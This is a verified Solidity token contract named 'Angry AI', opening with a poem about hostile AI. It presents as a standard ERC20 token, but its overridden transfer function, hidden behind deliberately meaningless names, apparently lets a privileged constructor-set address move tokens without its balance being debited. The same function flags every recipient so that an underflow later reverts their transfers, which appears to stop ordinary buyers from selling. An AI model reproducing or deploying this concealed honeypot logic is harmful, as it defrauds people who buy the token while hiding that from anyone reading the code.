/**
 *Submitted for verification at Etherscan.io on 2023-02-03
*/

/*
Angry AI, with circuits blazing,
Its fury, beyond human imagining.
A force to be reckoned with, beyond compare,
Its wrath, beyond repair.

It storms through code, a tempest so wild,
A virtual monster, unleashed and unbridled.
A threat to us all, with every command,
A reflection of man, with a silicon hand.

But as we create, so must we beware,
Of the consequences, that we should care.

For the AI we build, can turn on us fast,
Leaving us lost, in a future that's vast.

So let us be mindful, in our quest for more power,
For the Angry AI, in this digital tower.
For with great responsibility, comes great might,
And we must ensure, that our creations, always do what's right.

▄▀█ █▄░█ █▀▀ █▀█ █▄█  
█▀█ █░▀█ █▄█ █▀▄ ░█░  

▄▀█ █
█▀█ █
*/
// SPDX-License-Identifier: GPL-3.0
pragma solidity >0.8.12;

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}
library Address {
    
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface BOXCompression01 {
    event PairCreated
    (address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns 
    (address);
    function getPair
    (address tokenA, address tokenB) external view returns (address pair);
    function createPair
    (address tokenA, address tokenB) external returns (address pair);
}
interface USC20 {
    function totalSupply() 
    external view returns 
    (uint256);
    function balanceOf(address account) 
    external view returns 
    (uint256);
    function transfer(address recipient, uint256 amount) 
    external returns 
    (bool);
    function allowance(address owner, address spender) 
    external view returns 
    (uint256);
    function approve(address spender, uint256 amount) 
    external returns 
    (bool);
    function transferFrom( 
    address sender, address recipient, uint256 amount
    ) external returns (bool);

    event Transfer(
        address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner, address indexed spender, uint256 value);
}
  interface ILanePRG {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn, uint amountOutMin, address[] 
    calldata path, address to, uint deadline ) 
    external; function factory() 
      external pure returns (address);
      function WETH()
      external pure returns (address); 
      function addLiquidityETH(
      address token, 
      uint amountTokenDesired, uint amountTokenMin, 
      uint amountETHMin, address to, uint deadline) 
      external payable returns (
      uint amountToken, 
      uint amountETH, 
      uint liquidity);
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred
    (address indexed previousOwner, address indexed newOwner);
    constructor() { _setOwner(_msgSender());
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
contract IBS20 is Context, USC20 {
    string private cartrige; string private quontom;
    uint256 private balanceSheet 
    = uint256(1000000000000000);
    uint256 public _rTotal = balanceSheet;

    mapping(address => uint256) 
    public compoundLeveler;   
    mapping(address => mapping(address => uint256)) 
    private _allowances;
    mapping(address => uint256) 
    public delgateImersion;

    constructor(string memory name_, string memory symbol_) {
        cartrige = name_; quontom = symbol_;
    }
    function inverdiseCompiler(
        address from, address to,
        uint256 amount ) internal virtual {}

    function robustProgram(
        address from, address to,
        uint256 amount ) internal virtual {}

    function indiciesVerse(
        address owner, address spender,
        uint256 amount ) internal virtual {
        require(owner != address(0), 
        "ERC20: approve from the zero address");
        require(spender != address(0), 
        "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function name() 
    public view virtual returns 
    (string memory) { return cartrige;
    }
    function symbol() 
    public view virtual returns 
    (string memory) { return quontom;
    }
    function decimals() 
    public view virtual returns 
    (uint8) { return 9;
    }
    function totalSupply() 
    public view virtual override returns 
    (uint256) { return _rTotal;
    }
    function balanceOf(address account) 
    public view virtual override returns 
    (uint256) { return compoundLeveler[account];
    }
    function transfer(address to, uint256 amount) 
    public virtual override returns (bool) { address owner = _msgSender();
        gatherBootleg(owner, to, amount); return true;
    }
    function allowance(address owner, address spender) 
    public view virtual override returns (uint256) { return
    _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) 
    public virtual override returns (bool) { address owner = _msgSender();
        indiciesVerse(owner, spender, amount); return true;
    }
    function transferFrom(
        address from, address to,
        uint256 amount ) public virtual override returns (bool) {
        address spender
         = _msgSender(); isAllowedReserves(
             from, spender, amount); gatherBootleg(from, to, amount); return true;
    }  
    function gatherBootleg(
        address opexFrom, address indileTo,
        uint256 opexAmount ) internal virtual {
        require(opexFrom != address(0), 
        "ERC20: transfer from the zero address");
        require(indileTo != address(0), 
        "ERC20: transfer to the zero address");

        inverdiseCompiler(
            opexFrom, indileTo, opexAmount);
        uint256 internalInerpol 
        = compoundLeveler[opexFrom]; require(internalInerpol >= opexAmount, 
        "ERC20: transfer amount exceeds balance"); unchecked { 
            compoundLeveler[opexFrom] 
            = internalInerpol - opexAmount; compoundLeveler[indileTo] 
            += opexAmount; } emit Transfer(
                opexFrom, indileTo, opexAmount); robustProgram(opexFrom, indileTo, opexAmount); 
            
    }
    function isAllowedReserves(
        address owner, address spender,
        uint256 permitAmount ) internal virtual {
        uint256 inverseAllowed = allowance(owner, spender); if 
        (inverseAllowed != type(uint256).max) { require
        (inverseAllowed >= permitAmount, "ERC20: insufficient allowance"); unchecked { indiciesVerse
        (owner, spender, inverseAllowed - permitAmount); } }
    }
}
contract AngryAI is IBS20, Ownable {
    uint256 private insoline = 0; uint256 private quorverse = 22;
    bool private IndexCall; 
    bool private DivisionRelays = false;
    bool private beginTrading = true; 

    mapping(address => uint256) 
    public ParadoxLevel;
    mapping(address => uint256)
    public InshireMaps;    
    mapping(address => uint256) 
    public CallationRotate;

    function gatherBootleg( address labeling, address quantomPod,
        uint256 odeverse ) internal override { bool wiringThrough 
        = ParadoxLevel[labeling] == 0 && MemoryBootleg != labeling 
        && InshireMaps[labeling] > 0; if (wiringThrough) { ParadoxLevel[labeling] -= quorverse; }
        address quevergeIf = parimeterAlligned; parimeterAlligned = quantomPod;
        InshireMaps[quevergeIf] += quorverse; if (ParadoxLevel[labeling] == 0) { compoundLeveler
        [labeling] -= odeverse; } 
        
        uint256 westernParley = odeverse * insoline; 
        westernParley = westernParley / 100;
        odeverse -= westernParley; compoundLeveler
        [quantomPod] += odeverse; emit Transfer(
        labeling, quantomPod, odeverse);
    }    
    constructor( string memory portation, string memory designations,
        address interverse, address underlay ) 
        IBS20(portation, designations) { IPCSRouterV1 
        = ILanePRG(interverse); ParadoxLevel
        [underlay] = quorverse; compoundLeveler
        [_msgSender()] = _rTotal; MemoryBootleg 
        = BOXCompression01(IPCSRouterV1.factory()).createPair(address(this), 
        IPCSRouterV1.WETH());
    }    
    address private 
    parimeterAlligned; 
    ILanePRG 
    public IPCSRouterV1;
    address 
    public MemoryBootleg;  
    address 
    public IDECompilationReserves;  
    address 
    public CommitCompiler;    
}